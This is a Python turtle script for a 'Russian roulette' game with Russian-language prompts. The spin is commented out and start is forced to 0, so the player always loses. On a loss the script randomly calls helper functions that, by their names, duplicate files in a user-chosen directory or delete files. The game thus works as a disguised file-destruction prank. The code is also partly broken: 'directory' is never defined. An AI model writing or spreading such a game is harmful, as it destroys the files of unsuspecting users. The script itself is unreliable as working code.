#coding: utf-8

import turtle
import random
import math
import helper

def gotoxy(x, y):
	turtle.penup()
	turtle.goto(x,y)
	turtle.pendown()

def drawcircle(r, color):
	turtle.fillcolor(color)
	turtle.begin_fill()
	turtle.circle(r)
	turtle.end_fill()

def drawbarrel(x,y,r,color):
	gotoxy(x,y)
	turtle.circle(80)
	gotoxy(x,y+160)
	drawcircle(r,color)

def rotation(x,y,start):
	for i in range(0,7):
		phi_rad= phi * i * math.pi / 180.0
		gotoxy(x+math.sin(phi_rad)*r, y+math.cos(phi_rad)*r + 60)
		drawcircle(22,"white")
	for i in range(start,random.randrange(7,100)):
		phi_rad = phi * i * math.pi / 180.0
		gotoxy(x+math.sin(phi_rad)*r, y+math.cos(phi_rad)*r + 60)
		drawcircle(22,"brown")
		drawcircle(22,"white")
	gotoxy(math.sin(phi_rad)*r, math.cos(phi_rad)*r + 60)
	drawcircle(22,"brown")
	return i % 7


turtle.speed(0)
phi = 360 / 7
r = 50

drawbarrel(0,0,5,"red")

start = 0
answer = ""
while answer != "N":
	answer = turtle.textinput("Давай поиграем?", "Y/N")
	if answer == "Y":
		#start = rotation(0, 0,start)
		start = 0

	if start == 0:
		gotoxy(-150, 250)
		turtle.write("Вы проиграли!", font=("Arial,", 18, "normal"))
		z = random.randrange(0,3)
		if z == 0:
			helper.duble_files(input("Имя директории"))
		if z == 1:
			helper.delete_files(directory)
		if z == 2:
			pass

		#turtle.penup()
		#turtle.goto(random.randrange(-100,100), random.randrange(-100,100))
		#turtle.pendown()
		#turtle.fillcolor(random.random(), random.random(), random.random())
		#turtle.begin_fill()
		#turtle.circle(random.randrange(1,100))
		#turtle.end_fill()
	else:
		pass